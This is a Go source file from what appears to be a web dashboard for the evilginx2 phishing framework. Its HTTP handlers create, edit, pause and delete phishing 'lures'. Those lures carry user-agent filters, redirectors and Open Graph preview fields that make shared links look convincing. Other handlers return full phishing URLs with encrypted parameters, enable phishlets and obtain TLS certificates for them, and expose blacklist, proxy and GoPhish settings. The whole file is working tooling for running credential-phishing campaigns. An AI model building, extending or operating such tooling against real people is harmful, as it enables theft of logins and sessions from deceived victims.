package dashboard

import (
	"fmt"
	"net/http"
	"strconv"
	"strings"
	"time"

	"github.com/gorilla/mux"

	"github.com/kgretzky/evilginx2/core"
)

// validateLureHostname rejects a custom lure hostname that isn't the server base
// domain or a subdomain of it. An empty hostname is valid (the lure then uses
// the phishlet's landing host). This prevents non-public hostnames (e.g.
// "localhost") from being added to the active set and breaking autocert.
func (s *Server) validateLureHostname(hostname string) error {
	hostname = strings.TrimSpace(strings.ToLower(hostname))
	if hostname == "" {
		return nil
	}
	base := s.cfg.GetBaseDomain()
	if base == "" {
		return fmt.Errorf("set the server base domain before assigning a lure hostname")
	}
	if hostname != base && !strings.HasSuffix(hostname, "."+base) {
		return fmt.Errorf("lure hostname must be '%s' or end with '.%s' (leave empty to use the phishlet's default host)", base, base)
	}
	return nil
}

// ---- lures ----------------------------------------------------------------

func (s *Server) handleListLures(w http.ResponseWriter, r *http.Request) {
	writeJSON(w, http.StatusOK, map[string]interface{}{"lures": s.cfg.ExportLures()})
}

type lureRequest struct {
	Phishlet      string `json:"phishlet"`
	Path          string `json:"path"`
	Hostname      string `json:"hostname"`
	RedirectUrl   string `json:"redirect_url"`
	Redirector    string `json:"redirector"`
	UaFilter      string `json:"ua_filter"`
	Info          string `json:"info"`
	OgTitle       string `json:"og_title"`
	OgDescription string `json:"og_desc"`
	OgImageUrl    string `json:"og_image"`
	OgUrl         string `json:"og_url"`
}

func (s *Server) handleCreateLure(w http.ResponseWriter, r *http.Request) {
	u := userFromContext(r.Context())
	var req lureRequest
	if err := decodeJSON(r, &req); err != nil {
		writeError(w, http.StatusBadRequest, "invalid request body")
		return
	}
	if _, err := s.cfg.GetPhishlet(req.Phishlet); err != nil {
		writeError(w, http.StatusBadRequest, "unknown phishlet: "+req.Phishlet)
		return
	}
	if err := s.validateLureHostname(req.Hostname); err != nil {
		writeError(w, http.StatusBadRequest, err.Error())
		return
	}
	path := req.Path
	if path == "" {
		path = "/" + core.GenRandomString(8)
	}
	l := &core.Lure{
		Phishlet:        req.Phishlet,
		Path:            path,
		Hostname:        req.Hostname,
		RedirectUrl:     req.RedirectUrl,
		Redirector:      req.Redirector,
		UserAgentFilter: req.UaFilter,
		Info:            req.Info,
		OgTitle:         req.OgTitle,
		OgDescription:   req.OgDescription,
		OgImageUrl:      req.OgImageUrl,
		OgUrl:           req.OgUrl,
	}
	s.cfg.AddLure(req.Phishlet, l)
	s.store.Audit(u.Username, "create_lure", req.Phishlet, path, clientIP(r))
	writeJSON(w, http.StatusCreated, map[string]interface{}{"lures": s.cfg.ExportLures()})
}

func (s *Server) handleUpdateLure(w http.ResponseWriter, r *http.Request) {
	u := userFromContext(r.Context())
	index, _ := strconv.Atoi(mux.Vars(r)["index"])
	existing, err := s.cfg.GetLure(index)
	if err != nil {
		writeError(w, http.StatusNotFound, "lure not found")
		return
	}
	var req lureRequest
	if err := decodeJSON(r, &req); err != nil {
		writeError(w, http.StatusBadRequest, "invalid request body")
		return
	}
	if err := s.validateLureHostname(req.Hostname); err != nil {
		writeError(w, http.StatusBadRequest, err.Error())
		return
	}
	// preserve identity/phishlet; update mutable presentation/routing fields
	l := *existing
	if req.Path != "" {
		l.Path = req.Path
	}
	l.Hostname = req.Hostname
	l.RedirectUrl = req.RedirectUrl
	l.Redirector = req.Redirector
	l.UserAgentFilter = req.UaFilter
	l.Info = req.Info
	l.OgTitle = req.OgTitle
	l.OgDescription = req.OgDescription
	l.OgImageUrl = req.OgImageUrl
	l.OgUrl = req.OgUrl
	if err := s.cfg.SetLure(index, &l); err != nil {
		writeError(w, http.StatusBadRequest, err.Error())
		return
	}
	s.store.Audit(u.Username, "update_lure", strconv.Itoa(index), l.Phishlet, clientIP(r))
	writeJSON(w, http.StatusOK, map[string]interface{}{"lures": s.cfg.ExportLures()})
}

type pauseLureRequest struct {
	Duration string `json:"duration"`
}

func (s *Server) handlePauseLure(w http.ResponseWriter, r *http.Request) {
	u := userFromContext(r.Context())
	index, _ := strconv.Atoi(mux.Vars(r)["index"])
	l, err := s.cfg.GetLure(index)
	if err != nil {
		writeError(w, http.StatusNotFound, "lure not found")
		return
	}
	var req pauseLureRequest
	if err := decodeJSON(r, &req); err != nil {
		writeError(w, http.StatusBadRequest, "invalid request body")
		return
	}
	dur, err := core.ParseDurationString(req.Duration)
	if err != nil {
		writeError(w, http.StatusBadRequest, "invalid duration (e.g. 30m, 2h, 1d): "+err.Error())
		return
	}
	nl := *l
	nl.PausedUntil = time.Now().Add(dur).Unix()
	if err := s.cfg.SetLure(index, &nl); err != nil {
		writeError(w, http.StatusBadRequest, err.Error())
		return
	}
	s.store.Audit(u.Username, "pause_lure", strconv.Itoa(index), req.Duration, clientIP(r))
	writeJSON(w, http.StatusOK, map[string]interface{}{"lures": s.cfg.ExportLures()})
}

func (s *Server) handleUnpauseLure(w http.ResponseWriter, r *http.Request) {
	u := userFromContext(r.Context())
	index, _ := strconv.Atoi(mux.Vars(r)["index"])
	l, err := s.cfg.GetLure(index)
	if err != nil {
		writeError(w, http.StatusNotFound, "lure not found")
		return
	}
	nl := *l
	nl.PausedUntil = 0
	if err := s.cfg.SetLure(index, &nl); err != nil {
		writeError(w, http.StatusBadRequest, err.Error())
		return
	}
	s.store.Audit(u.Username, "unpause_lure", strconv.Itoa(index), "", clientIP(r))
	writeJSON(w, http.StatusOK, map[string]interface{}{"lures": s.cfg.ExportLures()})
}

type lureUrlRequest struct {
	Params map[string]string `json:"params"`
}

// handleGetLureUrl returns the full phishing URL for a lure, optionally with
// encrypted custom parameters (terminal: lures get-url).
func (s *Server) handleGetLureUrl(w http.ResponseWriter, r *http.Request) {
	index, _ := strconv.Atoi(mux.Vars(r)["index"])
	var req lureUrlRequest
	// body is optional
	if r.ContentLength != 0 {
		if err := decodeJSON(r, &req); err != nil {
			writeError(w, http.StatusBadRequest, "invalid request body")
			return
		}
	}
	u, err := s.cfg.GetLurePhishUrl(index, req.Params)
	if err != nil {
		writeError(w, http.StatusBadRequest, err.Error())
		return
	}
	writeJSON(w, http.StatusOK, map[string]interface{}{"url": u})
}

func (s *Server) handleDeleteLure(w http.ResponseWriter, r *http.Request) {
	u := userFromContext(r.Context())
	index, _ := strconv.Atoi(mux.Vars(r)["index"])
	if err := s.cfg.DeleteLure(index); err != nil {
		writeError(w, http.StatusNotFound, "lure not found")
		return
	}
	s.store.Audit(u.Username, "delete_lure", strconv.Itoa(index), "", clientIP(r))
	writeJSON(w, http.StatusOK, map[string]interface{}{"lures": s.cfg.ExportLures()})
}

// ---- phishlets ------------------------------------------------------------

func (s *Server) handleListPhishlets(w http.ResponseWriter, r *http.Request) {
	writeJSON(w, http.StatusOK, map[string]interface{}{"phishlets": s.cfg.ExportPhishlets()})
}

func (s *Server) handleEnablePhishlet(w http.ResponseWriter, r *http.Request) {
	u := userFromContext(r.Context())
	name := mux.Vars(r)["name"]
	if err := s.cfg.SetSiteEnabled(name); err != nil {
		writeError(w, http.StatusBadRequest, err.Error())
		return
	}
	// provision TLS certificates so the change takes effect without a restart;
	// roll back the enable if certificates can't be obtained.
	if err := s.manageCertificates(); err != nil {
		s.cfg.SetSiteDisabled(name)
		s.manageCertificates()
		writeError(w, http.StatusBadGateway, "phishlet enabled in config but TLS setup failed: "+err.Error())
		return
	}
	s.store.Audit(u.Username, "enable_phishlet", name, "", clientIP(r))
	resp := map[string]interface{}{"phishlets": s.cfg.ExportPhishlets()}
	// non-blocking: surface a host collision so the operator can resolve it,
	// but multiple distinct phishlets stay enabled together without issue.
	if cols := s.cfg.PhishletCollisions()[name]; len(cols) > 0 {
		resp["warning"] = "host collision with: " + strings.Join(cols, ", ") + " — these phishlets share a hostname and won't both serve correctly"
	}
	writeJSON(w, http.StatusOK, resp)
}

func (s *Server) handleDisablePhishlet(w http.ResponseWriter, r *http.Request) {
	u := userFromContext(r.Context())
	name := mux.Vars(r)["name"]
	if err := s.cfg.SetSiteDisabled(name); err != nil {
		writeError(w, http.StatusBadRequest, err.Error())
		return
	}
	s.manageCertificates()
	s.store.Audit(u.Username, "disable_phishlet", name, "", clientIP(r))
	writeJSON(w, http.StatusOK, map[string]interface{}{"phishlets": s.cfg.ExportPhishlets()})
}

// manageCertificates provisions TLS certs for active hostnames via the live
// proxy. No-op when the proxy isn't wired in (e.g. tests).
func (s *Server) manageCertificates() error {
	if s.proxy == nil {
		return nil
	}
	return s.proxy.ManageCertificates(false)
}

// ---- config ---------------------------------------------------------------

func (s *Server) handleGetConfig(w http.ResponseWriter, r *http.Request) {
	settings := s.cfg.ExportSettings()
	writeJSON(w, http.StatusOK, map[string]interface{}{
		"general":         settings.General,
		"blacklist":       settings.Blacklist,
		"proxy":           settings.Proxy,
		"gophish":         settings.GoPhish,
		"blacklist_modes": settings.BlacklistModes,
		"proxy_types":     settings.ProxyTypes,
		"version":         s.version,
	})
}
